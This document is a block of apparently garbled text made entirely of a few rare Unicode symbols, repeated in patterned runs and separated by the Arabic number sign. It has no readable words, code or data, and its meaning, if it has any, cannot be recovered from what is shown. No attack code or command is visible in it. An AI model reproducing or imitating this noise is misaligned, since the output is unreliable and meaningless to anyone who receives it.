︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬